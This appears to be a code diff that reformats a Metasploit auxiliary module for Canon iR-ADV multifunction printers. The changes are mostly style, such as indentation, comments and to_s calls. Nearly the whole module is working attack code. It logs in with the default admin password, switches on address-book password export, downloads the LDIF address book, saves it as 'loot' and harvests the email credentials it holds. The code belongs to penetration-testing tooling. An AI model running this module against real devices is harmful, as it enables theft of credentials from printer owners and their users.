@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 #
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,34 +7,32 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Canon IR-Adv Password Extractor',
-      'Description'    => %q{
-        This module will extract the passwords from address books on various Canon IR-Adv mfp devices.
-        Tested models:
-        iR-ADV C2030,
-        iR-ADV 4045,
-        iR-ADV C5030,
-        iR-ADV C5235,
-        iR-ADV C5240,
-        iR-ADV 6055,
-        iR-ADV C7065
-      },
-      'Author'         =>
-        [
-          'Deral "Percentx" Heiland',
-          'Pete "Bokojan" Arzamendi',
-          'William Vu',
-          'Dev Mohanty'
-        ],
-      'License'        => MSF_LICENSE
-    ))
+                      'Name'           => 'Canon IR-Adv Password Extractor',
+                      'Description'    => %q(
+                        This module will extract the passwords from address books on various Canon IR-Adv mfp devices.
+                        Tested models:
+                        iR-ADV C2030,
+                        iR-ADV 4045,
+                        iR-ADV C5030,
+                        iR-ADV C5235,
+                        iR-ADV C5240,
+                        iR-ADV 6055,
+                        iR-ADV C7065
+                      ),
+                      'Author'         =>
+                        [
+                          'Deral "Percentx" Heiland',
+                          'Pete "Bokojan" Arzamendi',
+                          'William Vu',
+                          'Dev Mohanty'
+                        ],
+                      'License'        => MSF_LICENSE))
 
     register_options(
       [
@@ -44,7 +43,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('PASSWD', [ true, 'The default Admin password', '7654321']),
         OptInt.new('TIMEOUT', [true, 'Timeout for printer probe', 20])
 
-      ], self.class)
+      ], self.class
+    )
   end
 
   def run_host(ip)
@@ -52,35 +52,35 @@ class MetasploitModule < Msf::Auxiliary
     login(ip)
   end
 
-#Authenticate to management function on Canon MFP and build needed cookies for dta harvesting
+  # Authenticate to management function on Canon MFP and build needed cookies for dta harvesting
   def login(ip)
     vars_post = {
       "uri" => "%2f",
-      "deptid" => "#{datastore['USER']}",
-      "password" => "#{datastore['PASSWD']}"
+      "deptid" => datastore['USER'].to_s,
+      "password" => datastore['PASSWD'].to_s
     }
     begin
       res = send_request_cgi({
-        'method'  => 'POST',
-        'uri'     => normalize_uri('/login'),
-        'vars_post' => vars_post
-      }, datastore['TIMEOUT'].to_i)
+                               'method' => 'POST',
+                               'uri' => normalize_uri('/login'),
+                               'vars_post' => vars_post
+                             }, datastore['TIMEOUT'].to_i)
     end
 
-    #grab Canon sessionid cookie
+    # grab Canon sessionid cookie
     idcookie = res.nil? ? nil : res.get_cookies
 
     if res.code == 301 || res.code == 302 && res.headers.include?('Location')
       print_good("#{rhost} - SUCCESSFUL login with USER='#{datastore['USER']}' : PASSWORD='#{datastore['PASSWD']}'")
 
-      #grab Canon IR= session cookie
+      # grab Canon IR= session cookie
       res = send_request_cgi({
-        'method'  => 'GET',
-        'uri'     => normalize_uri('/rps/nativetop.cgi?RUIPNxBundle=&CorePGTAG=PGTAG_CONF_ENV_PAP&Dummy=1400782981064'),
-        'headers' => {'Cookie' => "#{idcookie}"},
-      }, datastore['TIMEOUT'].to_i)
+                               'method'  => 'GET',
+                               'uri'     => normalize_uri('/rps/nativetop.cgi?RUIPNxBundle=&CorePGTAG=PGTAG_CONF_ENV_PAP&Dummy=1400782981064'),
+                               'headers' => { 'Cookie' => idcookie.to_s }
+                             }, datastore['TIMEOUT'].to_i)
       ircookie = res.nil? ? nil : res.get_cookies
-      cookies=("#{idcookie}; #{ircookie}")
+      cookies = "#{idcookie}; #{ircookie}"
 
       set_allow(cookies)
       extract(cookies, ip)
@@ -90,7 +90,6 @@ class MetasploitModule < Msf::Auxiliary
       print_error("Failed to login on #{rhost}. Please check the password for the #{datastore['USER']} account ")
     end
   end
-
 
   # Set the allow password export to on
   def set_allow(cookies)
@@ -105,18 +104,18 @@ class MetasploitModule < Msf::Auxiliary
     }
     begin
       res = send_request_cgi({
-        'method'  => 'POST',
-        'uri'     => normalize_uri('/rps/cadrs.cgi'),
-        'vars_post' => vars_post,
-        'headers' => {'Cookie' => "#{cookies}"},
-      }, datastore['TIMEOUT'].to_i)
+                               'method'  => 'POST',
+                               'uri'     => normalize_uri('/rps/cadrs.cgi'),
+                               'vars_post' => vars_post,
+                               'headers' => { 'Cookie' => cookies.to_s }
+                             }, datastore['TIMEOUT'].to_i)
     end
   end
 
   # Extract the adress book data and save out to loot
   def extract(cookies, ip)
     vars_post = {
-      "AID" => "#{datastore['ADDRSBOOK']}",
+      "AID" => datastore['ADDRSBOOK'].to_s,
       "ACLS" => "1",
       "ENC_MODE" => "0",
       "ENC_FILE" => "password",
@@ -127,26 +126,26 @@ class MetasploitModule < Msf::Auxiliary
       "ERR_PG_KIND_FLG" => "Adress_Export"
     }
     res = send_request_cgi({
-      'method'  => 'POST',
-      'uri'     => normalize_uri('/rps/abook.ldif'),
-      'vars_post' => vars_post,
-      'headers' => {'Cookie' => "#{cookies}"},
-    }, datastore['TIMEOUT'].to_i)
+                             'method' => 'POST',
+                             'uri' => normalize_uri('/rps/abook.ldif'),
+                             'vars_post' => vars_post,
+                             'headers' => { 'Cookie' => cookies.to_s }
+                           }, datastore['TIMEOUT'].to_i)
     address_book = res.nil? ? nil : res.body
-    print_status("#{address_book}")
+    print_status(address_book.to_s)
 
-    #Woot we got loot.
+    # Woot we got loot.
     loot_name     = "canon.iradv.addressbook"
     loot_type     = "text/plain"
     loot_filename = "Canon-addressbook.text"
     loot_desc     = "Canon Addressbook Harvester"
-    p = store_loot(loot_name, loot_type, datastore['RHOST'], address_book , loot_filename, loot_desc)
+    p = store_loot(loot_name, loot_type, datastore['RHOST'], address_book, loot_filename, loot_desc)
     print_status("Credentials saved in: #{p}")
 
     harvest_ldif(address_book, ip)
   end
 
-# Reset the allow password export to off
+  # Reset the allow password export to off
   def set_disallow(cookies)
     vars_post = {
       "ADRSEXPPSWDCHK" => "1",
@@ -158,11 +157,11 @@ class MetasploitModule < Msf::Auxiliary
       "Dummy" => "1359048058115"
     }
     res = send_request_cgi({
-      'method'  => 'POST',
-      'uri'     => normalize_uri('/rps/cadrs.cgi'),
-      'vars_post' => vars_post,
-      'headers' => {'Cookie' => "#{cookies}"},
-    }, datastore['TIMEOUT'].to_i)
+                             'method'  => 'POST',
+                             'uri' => normalize_uri('/rps/cadrs.cgi'),
+                             'vars_post' => vars_post,
+                             'headers' => { 'Cookie' => cookies.to_s }
+                           }, datastore['TIMEOUT'].to_i)
   end
 
   # Harvest Credential
@@ -171,25 +170,25 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def harvest_credentials(mailaddress, pwd, ip)
-    return if mailaddress == nil
+    return if mailaddress.nil?
     username_domain = mailaddress.split('@')
     username = username_domain[0]
     domain = username_domain[1]
 
     service_data = {
-        address: Rex::Socket.getaddress(ip),
-        port: rport,
-        protocol: 'tcp',
-        service_name: ssl ? 'https' : 'http',
-        workspace_id: myworkspace_id
+      address: Rex::Socket.getaddress(ip),
+      port: rport,
+      protocol: 'tcp',
+      service_name: ssl ? 'https' : 'http',
+      workspace_id: myworkspace_id
     }
 
     credential_data = {
-        origin_type: :service,
-        module_fullname: self.fullname,
-        username: username,
-        private_data: pwd,
-        private_type: :password
+      origin_type: :service,
+      module_fullname: fullname,
+      username: username,
+      private_data: pwd,
+      private_type: :password
     }
 
     create_credential(credential_data.merge(service_data))
@@ -211,5 +210,4 @@ class MetasploitModule < Msf::Auxiliary
       users << user_attributes
     end
   end
-
 end
